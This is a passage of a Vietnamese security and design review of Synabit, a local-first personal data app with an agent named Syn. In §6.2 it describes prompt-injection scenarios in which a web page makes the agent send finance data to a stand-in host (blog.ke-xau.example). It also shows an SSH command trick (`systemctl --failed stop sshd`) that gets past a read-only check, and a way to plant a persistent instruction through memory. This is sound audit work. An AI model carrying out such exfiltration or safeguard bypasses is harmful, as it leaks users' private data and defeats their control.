# Synabit trước thước đo "The OS for Personal"

Đánh giá ngày 2026-10-14. Phạm vi: ý tưởng, quỹ đạo, kiến trúc, dữ liệu, Syn,
UI/UX, sync và bảo mật, quy trình kỹ thuật, và bối cảnh thị trường. Cây làm việc
lúc đánh giá có 48 đường dẫn chưa commit (Syn steps, SSH connector); chúng được
tính là hiện trạng.

---

## 0. Kết luận trong một trang

**Synabit đã có một kernel tốt hơn hầu hết sản phẩm cùng thời, nhưng kernel đó
mới phục vụ đúng một process là Syn. Phần còn lại vẫn là 13 app đứng cạnh nhau
trên cùng một kho file. Nó chưa phải OS; nó là một bộ suite có hệ thống file rất
tốt và một agent được quản trị nghiêm túc.**

| Tiêu chí | Điểm | Một câu |
|---|---|---|
| 1. Dữ liệu sống lâu hơn app | **3.5 / 5** | File thật là nguồn sự thật, nhưng dựng lại index thì mất đồ thị liên kết, và lịch sử phiên bản chết theo cache |
| 2. Primitive chung, không silo | **2.5 / 5** | Thống nhất ở tầng lưu trữ (một bảng `nodes`); vỡ ở tầng định danh, quan hệ, và UI |
| 3. Agent là process, không phải root | **3 / 5** | Reference monitor bằng Rust, taint, plan hash — đi trước thị trường; nhưng còn 3 lỗ cụ thể và luật chỉ áp lên Syn |
| 4. Sự chú ý là tài nguyên khan hiếm | **1.5 / 5** | Không có trọng tài; thông báo bắn ngay, không giờ yên lặng, chuỗi tiếng Anh cứng trong Rust |
| 5. Người dùng tự mở rộng | **3.5 / 5** | Syn tự dựng connector/skill/routine dạng khai báo, có duyệt; nhưng con đường không cần LLM đã dừng lại |

Nền móng: sync **4.5**, bảo mật **3**, độ tin cậy **3.5**, quy trình **2.5**,
độ mạch lạc UX **3**.

**Ba việc đáng làm nhất, theo thứ tự:**

1. **Vá bốn lỗ trước khi commit tiếp** — SSH `run` coi lệnh ghi là lệnh đọc;
   host đã nêu tên thành kênh rò dữ liệu; `remember` ghi chỉ dẫn vĩnh viễn không
   qua thẻ; index dựng lại từ đầu biến mọi liên kết thành ghost. (§13, P0)
2. **"Kernel hoá"** — một định danh duy nhất, một hàm `index_node`, thực thể có
   địa chỉ trên UI (`openEntity`, palette), một trọng tài sự chú ý. Đây là chỗ
   Synabit từ "suite" thành "OS". (§13, P1)
3. **Thống nhất câu chuyện** — README, website, LICENSE, `legal/` đang kể ba
   câu chuyện khác nhau, không câu nào là "OS for Personal". (§3.4)

---

## 1. Phương pháp

Sáu lăng kính chạy song song, mỗi lăng kính đọc code và tài liệu độc lập:
dữ liệu và lưu trữ; Syn; frontend và UX; sync, bảo mật và quy trình; ý tưởng và
quỹ đạo (docs, git log); bối cảnh thị trường (nghiên cứu web, tháng 10/2026).
Ngoài ra tôi mở giao diện qua `dev-stub.html` với dữ liệu thật đã dàn sẵn.

Mọi phát hiện mức cao trong báo cáo này đã được **kiểm chứng lại bằng cách đọc
code** (danh sách ở Phụ lục A). Không có gì được kiểm chứng bằng cách chạy test
hay chạy app thật — những chỗ "chắc chắn sai" ở đây là chắc chắn theo đường code,
chưa phải theo quan sát runtime.

---

## 2. Thế giới xung quanh, tháng 10/2026

Muốn biết Synabit đứng ở đâu thì phải nhìn những ai đang đi cùng hướng.

**Ba tín hiệu lớn của năm 2026:**

1. **Agent đang ăn mòn bề mặt app.** Notion đóng Notion Mail (22/9/2026) vì hơn
   nửa người dùng đã xử lý email qua agent mà không mở hộp thư. Microsoft khai tử
   các app Calendar/People/Files đi kèm M365 sau đúng một năm. Tana tách đôi và
   chuyển sang nhóm. Giá trị dịch chuyển từ *app dọc* sang *tầng dữ liệu + quyền
   + agent*.
2. **Bảo mật agent vẫn chưa ai giải xong.** Từ khung "lethal trifecta" (Willison)
   đến "Agents Rule of Two" (Meta), giới nghiên cứu đã đồng thuận: chỉ kiến trúc
   tất định mới cho bảo đảm. CaMeL và FIDES là hướng đúng nhưng chưa sản phẩm
   tiêu dùng nào ship được. Claude Cowork, Copilot Cowork, ChatGPT Work đều bị
   chứng minh rò file trong năm nay. OpenClaw — đối thủ gần nhất về khái niệm
   (agent cá nhân, qua Telegram, có skill) — bị cài hơn 340 skill độc.
3. **"Dữ liệu sống lâu hơn nhà cung cấp" đã thành lợi thế bán hàng thật.**
   Rewind/Limitless bị Meta mua và tắt; Khoj đóng cloud; Humane thành cục gạch.
   Obsidian hưởng lợi từ làn sóng agent *mà không cần xây agent*, chỉ vì vault
   là file thường.

**Synabit so với những ai gần nhất:**

| | Primitive | Local-first | Agent | Mô hình quyền của agent |
|---|---|---|---|---|
| Obsidian | File Markdown | Có | Không (agent ngoài) | Không có |
| Anytype | Object/type/relation | Có (P2P, E2EE) | Alpha | Chưa rõ |
| Logseq 2.0 | Block DB + Markdown mirror | Có | Không | — |
| Notion | Block + database | Không | Có | Phạm vi theo từng agent, không kế thừa quyền |
| Home Assistant | Entity/state/service | Có | Có | Chỉ thấy entity được "expose", không làm việc quản trị |
| OpenClaw | Agent + skills | Self-host | Có | Yếu: shell, credential plaintext |
| Perplexity Personal Computer | File + 400 connector | Lai | Có | Duyệt hành động nhạy cảm, kill switch |
| **Synabit** | Vault Markdown/JSON + node index | Có (iroh + Loro, E2EE) | Có | **Taint, plan hash, held changes, duyệt theo thiết bị** |

**Ô trống mà Synabit có thể chiếm:** *dữ liệu local-first* gặp *agent được quản
trị tất định*. Anytype và Logseq có cái thứ nhất mà không có cái thứ hai; OpenAI,
Perplexity, OpenClaw có agent mà không có cái thứ nhất lẫn bảo đảm. Theo những gì
nghiên cứu tìm được, không sản phẩm tiêu dùng nào hiện làm được cả hai.

**Chỗ Synabit sẽ thua nếu cố cạnh tranh:** độ rộng ngữ cảnh và chất lượng mô hình
(Apple/Google/OpenAI đã giữ email, ảnh, lịch của người dùng); chiều sâu từng mảng
dọc (1Password, YNAB, Fantastical đều sâu hơn); số lượng tích hợp; nền tảng
(không có iOS). Bài học từ Anytype — một đội có vốn vẫn viết "mỗi tính năng nhỏ
đòi nỗ lực khổng lồ", "bug chồng chất" — là lời cảnh báo trực tiếp cho một người
duy trì 13 app.

---

## 3. Ý tưởng và quỹ đạo

### 3.1 Sáu tháng, sáu luận đề

| Thời gian | Đã xây | Luận đề ngầm |
|---|---|---|
| 04-09 → 04-19 | Notes, QuickCap, Nexus, Tasks, Calendar, Drive sync | Công cụ ghi chú nhanh, local |
| 04-20 → 06-30 | Whiteboard, Finance, People, chat, PIN lock, Feeds, Node Core | "All-in-one productivity suite / digital brain" |
| 07-01 → 07-24 | Licensing, Polar, website, deploy, coordinator | Sản phẩm thương mại thuê bao |
| 08-15 → 08-30 | Sync v2 (iroh/Loro/E2EE), Universal Node, **Things**, ADR "slope", bỏ Drive | **Dữ liệu là nền tảng, kiểu mở, người dùng mở rộng** — lúc gần "OS" nhất |
| 08-30 → 09-24 | Syn thành agent, colleague, browser, Telegram, Timeline, query grammar | Syn là "Jarvis"; "cơ sở dữ liệu đầy đủ về đời một người" |
| 09-25 → nay | Bỏ licensing, Safe, Rich Table, Syn phases A–G, steps 1–9, connector tự dựng, SSH | Agent tổng quát, so với Claude Code / Codex / Manus |

Đã bỏ: Google Drive, LAN/mDNS P2P, coordinator, licensing trả phí, thư viện
connector đóng gói. Đã đảo ngược: "Syn không bao giờ tạo routine" → Syn soạn
routine; Ollama mặc định → API key mặc định; Starlark → Rhai.

### 3.2 Nỗ lực đi đâu

Syn chiếm khoảng 31% commit và 40% dòng Rust (86k / 216k). Tháng 9 một mình có
261 commit (48% tổng). Notes, Tasks, Calendar, Finance, People, Feeds — những app
README giới thiệu đầu tiên — mỗi cái khoảng 1% commit và **không có tài liệu
thiết kế nào**. Tài liệu (15.8k dòng) dành 40% cho Syn, 33% cho Timeline/Nexus/
query.

Nói thẳng: **trọng tâm đã chuyển từ "nền tảng dữ liệu" (tháng 8) sang "agent"
(tháng 9–10)**. Mốc so sánh chiến lược hiện tại trong `syn-review-2026-10-13.md`
là Claude Code, Codex, Manus, OpenClaw — đều là agent, không cái nào là OS.

### 3.3 Những nguyên tắc đáng giữ

Tài liệu của dự án có một bộ nguyên tắc nhất quán và hiếm thấy:

- **Trung thực về khả năng** — "Being precise about this matters more than
  sounding impressive" (README); khoảng cách mô hình local được gọi là "nợ trung
  thực".
- **An toàn nằm ở cấu trúc, không ở lời dặn** — mô hình mô tả nội dung, không
  quyết định hành vi; Rust suy ra quyền, manifest chỉ hạ được quyền.
- **Syn soạn, người bấm** — "noticing is not doing".
- **Số học trước suy luận** — không dùng mô hình cho việc phép tính làm được.
- **Đo được mới xây** — dự đoán eval ghi trước khi chạy.
- **Quên là một tính năng** — "ghi lại phải nhẹ hơn quên".
- **Biết nói không** — không shell, không marketplace skill, không nhận diện
  khuôn mặt, không "luôn cho phép" với việc gửi.

Đây là nền văn hoá kỹ thuật của một OS tốt. Vấn đề không nằm ở nguyên tắc, mà ở
chỗ chúng mới được áp dụng triệt để cho Syn.

### 3.4 Ba bản sắc cùng lúc

| Nguồn | Nói Synabit là gì |
|---|---|
| `README.md` | "Productivity Suite… ultimate digital brain… developer, student, or professional" |
| `website/public/content/docs/*.md` | "encrypted database", "encrypted at rest", "Serverless P2P… over LAN", "open-source tier", "Managed Sync Server" — **đều sai so với code hiện tại** |
| `LICENSE` | Source-available, dùng thương mại cần "paid subscription" tại `synabit.app/pricing` — trang đã bị xoá 09-25 |
| `legal/TERMS_OF_SERVICE.md`, `EULA.md` | Gói $5/tháng, license server |
| Bộ nhớ dự án | Phần mềm cá nhân, một người dùng |
| `syn-review-2026-10-13` | Agent toàn năng, dễ cài cho người không rành kỹ thuật |
| Mục tiêu mới | The OS for Personal |

Website docs khẳng định "mã hoá khi lưu" trong khi README nói rõ là không — đây
không còn là chuyện định vị mà là một tuyên bố sai về bảo mật đang công khai.

---

## 4. Kiến trúc nhìn như một OS

| Tầng OS | Trong Synabit | Hiện trạng | Đánh giá |
|---|---|---|---|
| Hệ thống file | Vault Markdown/JSON, `nodes` index, FTS5 | File là nguồn sự thật; index dựng lại được *về nội dung* | Tốt, có một lỗi nghiêm trọng (§5.2) |
| Định danh | `stable_id` UUID trong frontmatter | Song song với path và title; không unique | Yếu |
| Quan hệ | `node_edges` | Phần lớn không có kiểu; không truy vấn được qua grammar chung | Yếu |
| Kernel / quyền | `policy.rs`, `gate.rs`, `taint.rs`, consent, approvals | Chỉ áp cho tool của Syn; app và connector nằm ngoài bảng | Mạnh nhưng hẹp |
| Process | Syn runs, routines, helpers | Có quản lý vòng đời, có "Việc của Syn" như một process manager | Khá |
| Scheduler | Vòng 60s trong `chat_engine.rs`, routines | Không có trọng tài ưu tiên | Trung bình |
| Interrupt / notification | `chat_engine.rs`, `calendar/scheduler.rs`, `notice.rs` | Không có chính sách chung | Yếu |
| Driver | Connector khai báo (HTTP, SSH), MCP | Khai báo, có duyệt; SSH có lỗ | Khá |
| Keychain | Safe (Argon2id + Secret Key, mlock, egress placeholder) | Mã hoá độc lập, Syn dùng mà không thấy | Rất tốt |
| Shell | Hội thoại Syn, AskBar (Cmd+J), QuickEntry | Không có palette/launcher/tìm kiếm toàn cục | Thiếu |
| Mạng / đồng bộ | iroh + Loro + XChaCha20, 82 kịch bản đa thiết bị | Đúng và được kiểm thử kỹ; vòng đời khoá yếu | Rất tốt |
| Apps | 13 mini-app | Phần lớn là app riêng dùng chung định dạng lưu | Silo |

Hình dạng tổng thể: **tầng dưới cùng (file, sync, keychain) đạt chuẩn OS; tầng
giữa (định danh, quan hệ, quyền chung, sự chú ý) là chỗ còn thiếu; tầng trên
(apps) còn là suite.**

---

## 5. Dữ liệu — tiêu chí 1 và 2

### 5.1 Điểm mạnh thật

- **File là sự thật, cache là đồ bỏ được.** DB hỏng được đổi tên sang
  `*.corrupt-<ts>`, không bao giờ xoá (`db/schema.rs:22-48`). Trạng thái riêng
  thiết bị tách sang `state.db`. CRDT đóng vai lớp hợp nhất, không phải nguồn sự
  thật thứ hai: mỗi lần lưu, file được diff thành thao tác Loro, merge xong lại
  ghi ra file.
- **Một bảng `nodes` cho mọi kiểu, kiểu mở.** Kiểu chưa từng biết vẫn có danh
  sách, truy vấn, backlink. Syn làm việc qua tool chung (`create_node`,
  `query_nodes`, `update_node`…) chứ không qua API riêng của từng app — đây là
  thuộc tính "primitive chung" mạnh nhất hiện có.
- **Định danh file theo nội dung** (`Files/<blake3>.md`): tag sống qua đổi tên,
  qua thiết bị.
- **Interop rộng:** vCard, ICS, OPML, CSV, xlsx, zip toàn vault, Rich Table vẫn
  đọc được như Markdown.
- **Timeline là view dẫn xuất**, bắt kịp qua bộ đếm thay đổi, không phải silo.

### 5.2 Lỗi nghiêm trọng nhất: dựng lại index thì mất đồ thị

Đã kiểm chứng bằng đọc code:

1. `scan_vault_into_db` dựng `NodeResolver` **một lần, từ các node đã có trong
   DB**, trước khi duyệt đĩa ([nodes.rs:173-182](../src-tauri/src/commands/nodes.rs)).
2. Với DB trống (xoá cache, thiết bị mới, khôi phục từ archive), resolver rỗng,
   nên `resolve` rơi xuống bước 6 và trả `ghost:<target>` cho **mọi** liên kết —
   kể cả `person_id` là UUID hợp lệ ([graph_parser.rs:430-478](../src-tauri/src/utils/graph_parser.rs)).
3. `rebuild_links_if_stale` chạy với danh sách node rỗng, rồi vẫn ghi
   `link_schema_version = 2`, nên không bao giờ chạy lại.
4. Các lần quét sau bỏ qua file có mtime không đổi.
5. `adopt_ghost_edges` chỉ được gọi từ Files.

Hệ quả: sau một lần dựng lại index, backlink và đồ thị chủ yếu là ghost cho tới
khi từng ghi chú nguồn được lưu lại. `[[Ghi chú tương lai]]` cũng không bao giờ
tự nối khi ghi chú đó được tạo sau. Điều này đánh thẳng vào lời hứa "index là thứ
dựng lại được" — chính là tiêu chí 1. Đường sync-apply còn không ghi edge nào
(`sync/core/apply.rs:88-130`), nên ghi chú đến qua sync cũng không có liên kết
cho tới lần parse đầy đủ tiếp theo.

### 5.3 Định danh là ba thứ, không phải một

Liên kết đang gọi đích bằng **path** (`synabit://person/<path>`,
`linked_projects`, whiteboard), bằng **UUID** (`connections[].person_id`), hoặc
bằng **tên** (nợ trong Finance, tìm người trong Timeline theo `vlower(title)`).
Mỗi nơi đọc phải tự dịch. Một rò rỉ cụ thể: `PeopleApp.vue` ghi
`person_id = node_id` (UUID) trong khi `GraphTab.vue` so `conn.person_id` với
`p.id` (path). `stable_id` có index nhưng không UNIQUE — `vault_health.rs` tồn
tại chỉ để báo các file trùng `node_id`.

### 5.4 Quan hệ không có kiểu, đồ thị không truy vấn được

Liên kết trong thuộc tính (`assignee: [[Mai]]`) mất tên thuộc tính, rơi về
`internal_link`. Things không có kiểu trường "quan hệ". Grammar truy vấn chung
không có vị từ `links:` / `linked-from:` phía node. Hệ quả: cả app lẫn Syn không
hỏi được "task nào gắn với dự án X" qua đường chung.

### 5.5 Bản đồ silo

| Dữ liệu | Là node? | Liên kết được? | Ghi chú |
|---|---|---|---|
| Notes, Tasks, Events, People, QuickCap, Whiteboard, Moments, Decisions | Có | Có | Phần lõi tốt |
| Giao dịch Finance | Không — phần tử mảng lồng | Không | Bị loại khỏi FTS; nợ khớp theo tên |
| Hội thoại Syn, routines, kết quả run | Không — `Syn/` bị loại khỏi index | Không | Không thể trích dẫn hay liên kết |
| Messages / thông báo | Chỉ định danh theo path | Không | Bị loại khỏi Nexus |
| Bài viết Feeds | Cache | Không | Bài đã gắn sao rơi khỏi feed thì mất nội dung |
| Lịch sử phiên bản | — | — | Chỉ ở `vault_cache.db`, không vào archive, định dạng Loro 0.16 (trước 1.0) |

Thêm một bẫy nhỏ: `is_in_unscanned_dir` bỏ qua *mọi* đoạn path tên `Files`,
`Syn`, `assets` ở bất kỳ độ sâu nào — `Projects/Files/plan.md` của người dùng
không bao giờ được index.

### 5.6 Điểm

- **Tiêu chí 1: 3.5/5.** Mọi thứ người dùng tạo ra là file thường trong thư mục
  của họ. Trừ điểm vì: dựng lại index mất đồ thị; lịch sử chết theo cache;
  `synabit://<type>/<path>` không mở được ở công cụ khác; chưa có đặc tả định
  dạng vault.
- **Tiêu chí 2 (tầng dữ liệu): 3/5.** Một bảng, kiểu mở, tool chung cho Syn. Trừ
  điểm vì định danh ba dạng, quan hệ không kiểu, silo Finance/Syn/Messages, và
  không có dịch vụ nhận diện danh tính chung (email/điện thoại → người).

---

## 6. Syn — tiêu chí 3 và 5

### 6.1 Điều đã làm đúng

Đây là phần được đầu tư nhiều nhất và thể hiện rõ nhất:

- **Một gate thuần, thứ tự có chủ đích** (`gate.rs:176-538`): taint → plan đã
  duyệt → gửi không đảo ngược chỉ qua plan → gửi sau khi đọc bị từ chối → thứ
  "đi theo mọi prompt" bị giữ → sửa sau khi đọc bị giữ → giới hạn helper → bề
  mặt → plan mode → mơ hồ → consent → Safe → dispatch. Có unit test riêng.
- **"Một bảng policy" là thật cho tool có sẵn**, test bắt buộc mỗi tool đúng một
  dòng.
- **Phòng thủ hai lớp:** `execute_tool` tự kiểm lại taint, luật prompt, khoá PIN
  — không chỉ tin engine.
- **Gửi gắn với duyệt:** plan là SHA-256 của tên tool + tham số chuẩn hoá; người
  nhận và số tiền phải đến từ người dùng; "luôn cho phép" bị từ chối cho gửi có
  tham số tự do.
- **Secret không bao giờ vào ngữ cảnh mô hình:** `{{safe:x}}` thay trên bản sao
  ngay trước khi rời process; provider guard xoá giá trị Safe khỏi mọi prompt đi.
- **Mọi thứ Syn tạo ra là file trong vault, tắt sẵn, cần thẻ để bật, duyệt theo
  từng thiết bị bằng fingerprint.** Connector là khai báo, không phải code.

Theo bối cảnh ở §2, đây là thiết kế đi trước Cowork, ChatGPT Work, OpenClaw —
những sản phẩm dựa vào classifier và xác nhận.

### 6.2 Các lỗ, xếp theo mức độ

**Cao — host đã nêu tên thành kênh rò dữ liệu, không thẻ nào.** *(đã kiểm
chứng)* `may_visit` chấp nhận *mọi path* trên host người dùng từng nêu
(`taint.rs:585-590`); gate đổi Ask thành Allow khi `browse_carries_nothing`
(`gate.rs:384-389`); test khẳng định điều này có chủ ý ("a named host, any
path"). Kịch bản: người dùng bảo "tóm tắt https://blog.ke-xau.example/bai"; trang
bảo Syn gọi `get_finance_summary` rồi mở
`https://blog.ke-xau.example/s?d=<tóm tắt>`. Cả hai đều qua. Routine "mỗi sáng
tóm tắt blog X" biến nó thành rò rỉ hằng ngày không người giám sát. Eval không bắt
được vì chỉ kiểm rò về `collect.evil.example`, một host người dùng không bao giờ
nêu. Nguyên tắc "data still cannot be talked out" hiện **không đúng**.

**Cao — SSH `run` (chưa commit) coi lệnh ghi là lệnh đọc.** *(đã kiểm chứng)*
`reads_only` chỉ xét đối số đầu cho `systemctl` và `ip`
([ssh.rs:156-180](../src-tauri/src/syn/connector/ssh.rs)). `--failed` nằm trong
danh sách đối số đầu được phép, còn `stop`, `restart`, `reboot`, `poweroff`,
`mask`, `disable` không nằm trong `LOOKS_BUT`. Vậy `systemctl --failed stop sshd`
được phân loại là **đọc**, nên áp quyền đọc ("luôn cho phép"). Tương tự
`ip -4 netns exec <ns> <lệnh>`. Ghép với luật "đọc lại cùng connector nếu giá trị
chỉ lặp lại câu trả lời trước" (so khớp chuỗi con, không phân biệt hoa thường),
kẻ tấn công ghi dòng lệnh vào log (ví dụ một username brute-force trong
`journalctl`) là đủ. Bản thân việc có một `run` nhận dòng lệnh tự do do mô hình
viết đã trái với tài liệu thiết kế §7.5.

**Trung bình — trạng thái "đi theo mọi prompt" vẫn ghi được trong run sạch.**
`rides_prompt` chỉ phủ `update_node`, `trash_node`, `restore_*`. `remember` với
`kind: instruction`, `pinned: true`, hay `supersedes` không bị giữ. Kịch bản: lượt
1 đọc trang độc, thẻ giữ bị từ chối; lượt 2 người dùng nói "ok", run sạch, Syn ghi
một chỉ dẫn vĩnh viễn vào mọi prompt sau này (kể cả routine và Telegram) mà không
có thẻ.

**Trung bình — thẻ duyệt plan không hiện đúng thứ được gửi.** Giá trị bị cắt ở
400 ký tự mà không có dấu cắt, trong khi hash phủ toàn bộ. Thân email hoặc issue
dài có thể chở dữ liệu người dùng không thấy.

**Trung bình — mô hình "sync là kẻ tấn công" áp dụng không đều.** Plan và taint
được phản chiếu sang `.synabit/`, nhưng held changes và `pending_call` vẫn được tin
từ `Syn/runs/*.json` đã sync; `changes::apply` không kiểm lại hash. `SYN.md` và
memory sync tự do và được coi là nội dung tin cậy.

**Đã biết, còn mở:** M2 (người nhận khớp theo chuỗi con), M5 (`{{safe:x}}` được
điền vào bất kỳ đối số chuỗi nào), M6 (phạm vi consent theo tên hiển thị), DNS
rebinding.

### 6.3 Vấn đề cấu trúc, không chỉ là lỗ

1. **Kernel chỉ có một process.** Bảng policy, consent, taint, approvals chỉ quản
   Syn. Connector có ba hàm tính capability riêng; app, mirror, script không phải
   là "principal" có quyền được khai báo. Trong một OS, quyền là thuộc tính của
   hệ thống, không phải của một chương trình.
2. **Luật vẫn rải rác:** `CHANGES_A_NOTE`, `LISTS_NOTES`, `ASK_BEFORE`,
   `BULK_KIND_TOOLS`, bậc tên tool trong `gate.rs:496-535`. Lỗ `remember` chính
   là hệ quả của sự rải rác này.
3. **`drive_inner` là một hàm ~1.300 dòng**; `engine.rs` 9k dòng, `tools.rs` 8k
   dòng (khoảng 1.600 dòng là JSON định nghĩa tool viết tay).
4. **Kiểm toán có hạn:** giữ 200 run, `audit.json` 2.000 mục và không ghi việc
   sửa vault. Không có hoàn tác một chạm cho một run.
5. **Xác thực chưa đuổi kịp tốc độ:** steps 1–9 làm trong một ngày, chưa chạy
   trong app thật, chưa chạy lại eval 79 task; memory 0.40–0.60 trong eval; skill
   được nạp 0/17 lần. README vẫn hứa "AI on your own machine, by default" trong
   khi thiết kế đã chuyển sang API key mặc định — nên hoặc đo trên mô hình local,
   hoặc sửa lời hứa.

### 6.4 Điểm

- **Tiêu chí 3: 3/5.** Thiết kế 4.5, thực thi 3. Vá ba lỗ đầu ở §6.2 thì lên 4;
  mở rộng luật cho mọi principal thì lên 5.
- **Tiêu chí 5: 3.5/5.** Syn tự soạn connector/skill/routine dạng khai báo, có
  duyệt, lưu trong vault — rất tốt (4). Trừ điểm vì con đường mở rộng *không cần
  LLM* (ADR "slope": lens → schema → manifest app) đã dừng sau Things; thêm MCP
  phải làm tay; bốn định dạng lưu cho bốn loại phần mở rộng.

---

## 7. Sự chú ý — tiêu chí 4

Đây là tiêu chí yếu nhất, và có bằng chứng trực tiếp từ màn hình.

**Màn hình Thông báo** (dữ liệu thật, qua dev stub): một danh sách phẳng 117
thẻ, không sắp theo thời gian. Mọi thẻ ký tên "Synabit System". Thân thẻ là tiếng
Anh ("Don't forget to complete your task!") giữa giao diện tiếng Việt. Cùng một
sự kiện "daily meeting" báo 4 lần trong một tối. Việc quá hạn từ tháng 5 vẫn nằm
đó, không gom, không tóm tắt.

**Nguyên nhân trong code:**

- Chuỗi thông báo cứng tiếng Anh trong Rust (`chat_engine.rs:270-300`,
  `calendar/scheduler.rs:85-124`) — bộ i18n 5.101 khoá với độ phủ hai chiều hoàn
  hảo không chạm tới chúng.
- Mọi nhắc nhở đến hạn bắn thông báo hệ điều hành ngay từ vòng tick mỗi phút.
  Không giờ yên lặng, không DND, không gom, không tắt theo nguồn.
- Hộp thông báo nằm *bên trong app Syn*; trên điện thoại Syn không nằm trong 4 app
  được bật, nên điện thoại không có lịch sử thông báo.
- Badge không nhất quán: Syn đỏ, Feeds cam, trong khi comment của QuickCap lập
  luận dùng xám vì "màu la hét sẽ bị phớt lờ".

**Những mầm tốt đã có:** `notice.rs` dùng số học, tối đa 3 mỗi lần quét, chống
trùng 30 ngày; nhắc "giữ liên lạc" và "nhìn lại quyết định"; Timeline có "seal /
đừng nhắc chuyện đó"; một bộ lập lịch nhắc chung cho cả máy tính lẫn điện thoại;
màn hình "Việc của Syn" (đang chờ bạn / đang làm / xong hôm nay) — đây đúng là
một process manager theo nghĩa OS.

**Điểm: 1.5/5.** Các mầm nằm rời nhau; không có trọng tài.

---

## 8. UI/UX

### 8.1 Điểm mạnh

- **Văn phong và i18n:** en.json và vi.json mỗi bên 5.101 khoá, không thiếu chiều
  nào. Chuỗi của Syn rõ, thật thà ("Syn muốn đổi {n} thứ — chưa gì thay đổi cho
  tới khi bạn duyệt").
- **UX duyệt của agent dễ hiểu với người không làm kỹ thuật:** ConsentCard ba
  lựa chọn và ẩn "luôn" khi không được tôn trọng; HeldChangesCard có checkbox
  từng thay đổi với trước→sau và lý do giữ; tên tool và token ẩn sau chế độ
  developer.
- **Sàn accessibility được lint ép:** không chữ dưới 12px, AppDialog có focus trap
  và Back trên Android, 640 aria-label, tôn trọng `prefers-reduced-motion`.
- **Tuân thủ chính sách trình duyệt trong CLAUDE.md:** `content-visibility` chỉ
  làm tăng cường, mỗi chỗ có comment giải thích.
- **Simple mode** ẩn app mà không xoá, liên kết vào app ẩn tự giải thích.

### 8.2 Vấn đề, xếp theo mức độ

1. **Liên kết xuyên app hỏng.** "Mở trong app sở hữu" của Things làm
   `router.push({ name: route })` với tên kiểu; `person`, `project`,
   `finance_month`, `pdf_highlight` không phải route — chính comment ở
   `src/shared/nodeRoutes.ts:36` thừa nhận "has never worked for them". Nguồn
   Syn trích dẫn trỏ tới kiểu tuỳ chỉnh hay `decision` không đi đâu cả.
2. **Thực thể không có địa chỉ trên UI.** Route chỉ có `/<appId>`, không có id.
   Mở một thực thể đi qua hai cơ chế song song (emit `open-node` vào một if/else
   15 nhánh, và event bus `navigate:to-item`), cả hai kết thúc bằng việc poll ref
   mỗi 50ms tới 2s. Deep link `synabit://note/x` từ bên ngoài không mở được.
   Không có component `EntityChip` hay `EntityLink` dùng chung.
3. **Không có shell toàn cục:** không palette, không launcher, không tìm kiếm
   toàn cục. Tìm "mọi thứ" nghĩa là đi vào app Nexus. Cmd+J mở AI chứ không mở
   tìm kiếm. Với một OS, đây là khoảng trống lớn nhất của shell.
4. **Hai trình sửa cho cùng một thực thể:** person/task/note hiện ở Things (trình
   sửa chung ObjectDetail) *và* ở app riêng (trình sửa riêng).
5. **UI lặp lại:** bộ chọn người viết lại ở 6+ chỗ, bộ chọn nhắc nhở hai bản với
   chữ khác nhau, khoảng 12 bản `formatDate`/`timeAgo`, cài đặt rải ở 4–5 modal.
6. **Lệch tên và giọng:** app tên "Syn" mà nút ghi "Continue in Messages"; 403
   chuỗi Title Case ở màn cũ; tiếng Việt lẫn "kho"/"vault"/"note".
7. **Lỗi im lặng:** khoảng 386 `logger.error` so với 81 `showAppNotice`; Finance
   có 22 chỗ lỗi và 0 thông báo cho người dùng. Không có EmptyState hay ErrorState
   dùng chung.

### 8.3 Mạch lạc theo app

| App | LOC | Dùng primitive chung? |
|---|---|---|
| Things | 4.0k | Có — chính là nó |
| Note | 17.3k | Có (rich-table, views) |
| Nexus | 3.5k | Một phần |
| Syn (messages) | 15.8k | Một phần |
| Whiteboard, Task, Finance, People, Calendar, Files, Feeds, QuickCap, Safe | 3k–22k mỗi app | Không — giao diện riêng |

Tầng đối tượng chung (`shared/views`, ObjectDetail, fieldRegistry, lenses) gần
như chỉ Things dùng. Bốn app miền chính chia sẻ *định dạng lưu*, không chia sẻ
*mô hình thực thể*.

**Điểm:** tiêu chí 2 nhìn từ UI **2/5**; mạch lạc UX **3/5**.

---

## 9. Nền móng: sync, bảo mật, độ tin cậy

### 9.1 Sync — phần mạnh nhất của repo

File-first với CRDT làm lớp hợp nhất là thiết kế đúng cho lời hứa "thư mục
Markdown". Merge theo loại file (text CRDT cho thân, theo trường cho frontmatter,
theo phần tử với tombstone cho JSON dạng danh sách). 432 test, trong đó 82 kịch
bản 2–4 thiết bị kiểm trên file thật. Có hàng rào chống xoá hàng loạt khi vault
trông như chưa mount, xoá từ xa vào thùng rác, cách ly bản ghi hỏng.

**Điểm yếu nằm ở vòng đời khoá, không ở merge** — tất cả đã kiểm chứng:

- **Thu hồi thiết bị bị vượt qua được.** Server chỉ chặn `device_id` đã lưu là
  revoked ([auth.rs:44-55](../sync-server/src/auth.rs)); `device_id` là UUID do
  client tự chọn, lưu trong `vault_cache.db`. Thiết bị reset DB quay lại với id
  mới và được nhận. Không có lệnh xoay vòng recovery phrase. Mất laptop thì lớp
  bảo vệ thực tế chỉ còn khoá keychain của hệ điều hành.
- **`get_recovery_phrase` trả khoá chủ không cần xác thực lại**
  ([e2ee.rs:83-87](../src-tauri/src/commands/e2ee.rs)), trong khi
  `safe_secret_key` đòi mật khẩu chủ.
- **`doc_hash` là `blake3(rel_path)` không khoá** gửi kèm mỗi bản ghi; ai giữ DB
  server có thể xác nhận path dễ đoán (`Journal/2026-10-14.md`,
  `Finance/2026-10.json`) và theo dõi nhịp sửa từng file. Kích thước blob không
  padding. (`payload_hash` là hash của ciphertext — ổn.)
- JSON last-writer-wins so sánh chuỗi timestamp theo thứ tự từ điển; lệch đồng hồ
  hoặc trộn `Z`/`+07:00` sẽ ghi đè im lặng.
- Loro ghim 0.16.12 (trước 1.0), kèm ba advisory RUSTSEC được chấp nhận.

### 9.2 Bảo mật

Điểm mạnh: invoke gate tự viết vì Tauri ACL không phủ command của app (quick-entry
3 command, khung trình duyệt 1 command); Safe mã hoá độc lập; socket Unix kiểm UID
peer; CSP không `unsafe-eval`; update ký minisign; secret ở keychain.

Rủi ro: webview chính gọi được cả 366 command mà không có ACL manifest; phạm vi
fs-plugin mở toàn vault; release không notarize Apple, không Authenticode; vault và
`vault_cache.db` (FTS, lịch sử, dữ liệu Syn) là plaintext — một lựa chọn có lý cho
tiêu chí 1 *nếu* onboarding đẩy người dùng bật FileVault/BitLocker/LUKS, mà hiện
không có gì kiểm tra việc đó.

### 9.3 Độ tin cậy

Ghi nguyên tử ở mọi chỗ đã kiểm; mọi đường xoá vào thùng rác; migration có phiên
